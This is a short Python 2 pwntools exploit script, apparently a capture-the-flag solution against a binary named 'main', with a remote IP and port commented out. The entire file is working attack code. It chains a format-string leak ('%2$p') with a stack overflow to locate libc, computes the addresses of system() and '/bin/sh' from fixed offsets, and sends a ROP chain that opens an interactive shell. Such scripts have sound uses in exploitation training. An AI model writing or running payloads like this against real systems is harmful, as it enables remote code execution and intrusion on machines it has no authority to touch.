from pwn import *
import time
host = "139.59.30.165"
port = 9200
#p = remote(host, port)
p = process('./main')

main = 0x400637
pop_rdi = 0x400733

payload = "%2$p.."
payload += "A" * 66
payload += p64(main)

p.sendline(payload)
time.sleep(0.5)
data = p.recv(2048)
print data

print "[+] Leak boh: " + data.split(".")[0].split("\n")[2]
boh_libc = data.split(".")[0].split("\n")[2].replace("0x", "")
boh_libc = int(boh_libc, 16)
libc_start_main = boh_libc -0x19c50d
print "[+] Address of libc_start_main + something: 0x" + p64(libc_start_main)[::-1].encode("hex")
libc_start_main = libc_start_main - 245
print "[+] Address of libc_start_main: 0x" + p64(libc_start_main)[::-1].encode("hex")
base_libc = libc_start_main - 0x21e50
print "[+] Address of base_libc: 0x" + p64(base_libc)[::-1].encode("hex")
system_remote = base_libc + 0x46590
print "[+] Address of system_remote: 0x" + p64(system_remote)[::-1].encode("hex")
bin_sh = base_libc + 0x180543
print "[+] Address of bin_sh: 0x" + p64(bin_sh)[::-1].encode("hex")


payload = "A" * 72
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_remote)

p.send(payload)
time.sleep(0.5)
p.interactive()
p.close()
